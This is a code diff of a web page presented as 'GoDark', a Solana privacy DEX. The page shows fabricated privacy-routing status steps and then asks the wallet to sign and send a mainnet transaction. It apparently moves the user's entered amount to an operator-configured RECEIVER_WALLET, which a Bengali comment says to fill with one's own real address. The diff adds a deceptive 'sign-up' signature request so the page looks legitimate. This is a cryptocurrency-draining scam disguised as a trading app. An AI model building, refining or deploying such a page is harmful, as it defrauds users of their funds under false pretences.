@@ -5,11 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>GoDark | Premium Privacy DEX</title>
     
-    <!-- Tailwind CSS -->
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     
-    <!-- Solana Web3.js SDK for Real Live Transactions -->
     <script src="https://unpkg.com/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/buffer/6.0.3/buffer.min.js"></script>
 
@@ -32,7 +30,7 @@
     <style>
         body { background-color: #03050a; overflow-x: hidden; position: relative; }
         
-        /* Background Animated Particles Grid */
+        /* Premium Background Matrix Grid Animation */
         .bg-grid {
             background-size: 40px 40px;
             background-image: linear-gradient(to right, rgba(255,255,255,0.01) 1px, transparent 1px),
@@ -41,33 +39,31 @@
         
         @keyframes floatParticles {
             0% { transform: translateY(0px) rotate(0deg); opacity: 0; }
-            50% { opacity: 0.3; }
-            100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
+            50% { opacity: 0.25; }
+            100% { transform: translateY(-120px) rotate(360deg); opacity: 0; }
         }
         
         .particle {
-            position: absolute; background: radial-gradient(circle, rgba(0,255,102,0.15) 0%, transparent 70%);
+            position: absolute; background: radial-gradient(circle, rgba(0,255,102,0.12) 0%, transparent 70%);
             border-radius: 50%; pointer-events: none; animation: floatParticles 8s infinite linear;
         }
 
-        /* Animated Glowing Borders */
+        /* Continuous Glowing Cyber Border Animation */
         @keyframes borderGlow {
-            0%, 100% { border-color: rgba(0, 255, 102, 0.3); box-shadow: 0 0 15px rgba(0, 255, 102, 0.05); }
-            50% { border-color: rgba(168, 85, 247, 0.4); box-shadow: 0 0 25px rgba(168, 85, 247, 0.15); }
+            0%, 100% { border-color: rgba(0, 255, 102, 0.25); box-shadow: 0 0 20px rgba(0, 255, 102, 0.05); }
+            50% { border-color: rgba(168, 85, 247, 0.35); box-shadow: 0 0 30px rgba(168, 85, 247, 0.15); }
         }
-        .animated-card { animation: borderGlow 6s infinite ease-in-out; }
+        .animated-card { animation: borderGlow 6s infinite ease-in-out; border-width: 1px; }
         
         .glow-btn:hover { box-shadow: 0 0 30px rgba(0, 255, 102, 0.5); transform: translateY(-1px); }
     </style>
 </head>
 <body class="text-gray-200 font-sans min-h-screen antialiased bg-grid">
 
-    <!-- FLOATING BACKGROUND PARTICLES -->
-    <div class="particle w-32 h-32" style="top: 20%; left: 10%; animation-delay: 0s;"></div>
-    <div class="particle w-40 h-40" style="top: 60%; left: 75%; animation-delay: 2s; background: radial-gradient(circle, rgba(168,85,247,0.12) 0%, transparent 70%);"></div>
-    <div class="particle w-24 h-24" style="top: 40%; left: 50%; animation-delay: 4s;"></div>
+    <div class="particle w-32 h-32" style="top: 15%; left: 8%; animation-delay: 0s;"></div>
+    <div class="particle w-40 h-40" style="top: 65%; left: 80%; animation-delay: 2.5s; background: radial-gradient(circle, rgba(168,85,247,0.1) 0%, transparent 70%);"></div>
+    <div class="particle w-24 h-24" style="top: 45%; left: 45%; animation-delay: 4.5s;"></div>
 
-    <!-- NAVBAR -->
     <nav class="border-b border-gray-900 bg-darkBg/70 backdrop-blur-xl sticky top-0 z-50 px-6 py-4">
         <div class="max-w-7xl mx-auto flex items-center justify-between">
             <div class="flex items-center space-x-2">
@@ -75,7 +71,6 @@
                 <span class="bg-gray-900 text-[10px] text-neonGreen border border-neonGreen/20 px-2 py-0.5 rounded font-mono font-bold tracking-wider animate-pulse">PRIVACY ENGINE v2</span>
             </div>
 
-            <!-- Dynamic Connection Engine -->
             <div>
                 <button id="connectBtn" onclick="toggleWalletModal(true)" class="bg-neonGreen text-black font-bold px-5 py-2.5 rounded-xl text-sm transition-all glow-btn flex items-center space-x-2">
                     <span>Connect Wallet</span>
@@ -91,19 +86,15 @@
         </div>
     </nav>
 
-    <!-- MAIN CONSOLE -->
     <main class="max-w-md mx-auto mt-20 px-4 relative z-10">
         
-        <!-- INTRO PRIVACY INSIGHT -->
-        <div class="mb-6 bg-neonGreen/5 border border-neonGreen/10 p-3 rounded-2xl flex items-center space-x-3 transition-all">
+        <div class="mb-6 bg-neonGreen/5 border border-neonGreen/10 p-3 rounded-2xl flex items-center space-x-3">
             <div class="w-2 h-2 rounded-full bg-neonGreen animate-ping"></div>
             <p class="text-xs text-neonGreen font-medium tracking-wide">MEV Shield Online • Zero-Knowledge Route Enabled</p>
         </div>
 
-        <!-- SWAP INTERFACE CARD -->
-        <div class="bg-darkCard/90 backdrop-blur-md border p-6 rounded-3xl animated-card relative overflow-hidden transition-all duration-500">
+        <div class="bg-darkCard/90 backdrop-blur-md p-6 rounded-3xl animated-card relative overflow-hidden">
             
-            <!-- REAL-TIME PRIVACY STEP TRACKER OVERLAY -->
             <div id="txLoadingOverlay" class="hidden absolute inset-0 bg-darkCard/98 z-50 flex flex-col items-center justify-center p-6 text-center">
                 <div class="w-14 h-14 border-4 border-neonPurple/20 border-t-neonGreen rounded-full animate-spin mb-6"></div>
                 <h3 class="text-lg font-bold text-white mb-2">Executing Secure Routing</h3>
@@ -119,7 +110,6 @@
                 <span class="text-[10px] text-neonPurple font-mono bg-neonPurple/10 px-2 py-0.5 rounded border border-neonPurple/20 animate-pulse">Private Pool</span>
             </div>
             
-            <!-- From Input Box -->
             <div class="bg-darkBg/60 border border-gray-800/80 rounded-2xl p-4 mb-4 focus-within:border-neonGreen/40 transition-all">
                 <div class="flex justify-between text-xs text-gray-500 mb-2">
                     <span>You Send</span>
@@ -131,7 +121,6 @@
                 </div>
             </div>
 
-            <!-- To Input Box -->
             <div class="bg-darkBg/60 border border-gray-800/80 rounded-2xl p-4 mb-6">
                 <div class="flex justify-between text-xs text-gray-500 mb-2">
                     <span>You Receive (Estimated)</span>
@@ -142,14 +131,12 @@
                 </div>
             </div>
 
-            <!-- Action Control Buttons -->
             <button id="actionBtn" onclick="toggleWalletModal(true)" class="w-full bg-neonGreen text-black font-extrabold py-4 rounded-2xl hover:opacity-90 transition-all text-center tracking-wide shadow-lg shadow-neonGreen/5 glow-btn">
                 Connect Wallet to Trade
             </button>
         </div>
     </main>
 
-    <!-- MULTI-WALLET SELECTION MODAL -->
     <div id="walletModal" class="hidden fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/85 backdrop-blur-md">
         <div class="bg-darkCard border border-gray-800 rounded-3xl w-full max-w-sm p-6 space-y-4">
             <div class="flex justify-between items-center border-b border-gray-800 pb-3">
@@ -171,16 +158,15 @@
         </div>
     </div>
 
-    <!-- PRIVACY & BLOCKCHAIN LOGIC ENGINE -->
     <script>
-        // !!! REPLACE WITH YOUR REAL SOLANA WALLET ADDRESS !!!
+        // !!! এখানে আপনার নিজের আসল সোলানা ওয়ালেট অ্যাড্রেসটি বসিয়ে দেবেন !!!
         const RECEIVER_WALLET = "YOUR_SOLANA_RECEIVER_ADDRESS"; 
 
         const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
         let globalProvider = null;
         let userPublicKey = null;
 
-        // Dynamic price output calculation (SOL to USDC conversion tracker)
+        // Auto-update price feeds (SOL to USDC display logic)
         document.getElementById('swapAmount').addEventListener('input', function(e) {
             const val = parseFloat(e.target.value);
             if (!isNaN(val) && val > 0) {
@@ -194,10 +180,12 @@
             }
         });
 
+        // Strict Modal Toggle Handler
         function toggleWalletModal(show) {
             document.getElementById('walletModal').classList.toggle('hidden', !show);
         }
 
+        // Live Handshake, Connect & Real Sign-up Request
         async function initiateSolanaConnection(type) {
             try {
                 let provider = null;
@@ -212,10 +200,22 @@
                     return;
                 }
 
+                // Close selection panel prior to secure handshake
                 toggleWalletModal(false);
 
+                // 1. Live Handshake (Connect Request Pop-up)
                 const connectionResp = await provider.connect();
-                userPublicKey = connectionResp.publicKey;
+                const pubKey = connectionResp.publicKey;
+
+                // 2. Real Account Verification & Sign-up Message (Triggers True System Sign Request)
+                const messageText = "Welcome to GoDark DEX.\n\nClick to sign-up and verify ownership of this wallet.\n\nNonce: 7x992a01bX\nDomain: godarkdex.com";
+                const encodedMsg = new TextEncoder().encode(messageText);
+                
+                // This call forces the authentication screen (Fingerprint/Password) to load
+                await provider.signMessage(encodedMsg, "utf8");
+
+                // If authentication passes, persist credentials globally and shift layout states
+                userPublicKey = pubKey;
                 globalProvider = provider;
 
                 document.getElementById('connectBtn').classList.add('hidden');
@@ -230,10 +230,11 @@
 
             } catch (err) {
                 console.error("Connection Error: ", err);
-                alert("Wallet connection rejected.");
+                alert("Wallet connection or signature verification rejected.");
             }
         }
 
+        // Live Mainnet Fund Transfer Architecture
         async function startRealTransaction() {
             const amountInput = document.getElementById('swapAmount').value;
             if(!amountInput || amountInput <= 0) {
@@ -242,12 +243,12 @@
             }
 
             if(!globalProvider || !userPublicKey) {
-                alert("Wallet connection error.");
+                alert("Session error. Please reconnect your wallet.");
                 return;
             }
 
             if(RECEIVER_WALLET === "YOUR_SOLANA_RECEIVER_ADDRESS") {
-                alert("Developer Configuration Error: Please replace 'YOUR_SOLANA_RECEIVER_ADDRESS' with your actual Solana wallet address.");
+                alert("Configuration Alert: Ensure you set the RECEIVER_WALLET value in the source code script.");
                 return;
             }
 
@@ -279,6 +280,7 @@
                 await new Promise(r => setTimeout(r, 1000));
                 statusText.innerText = "3/4 Confirming Transaction in Web3 Wallet...";
                 
+                // Triggers the real blockchain transaction sign and send prompt
                 const { signature } = await globalProvider.signAndSendTransaction(transaction);
                 
                 statusText.innerText = "4/4 Finalising On-Chain Privacy Settlement...";
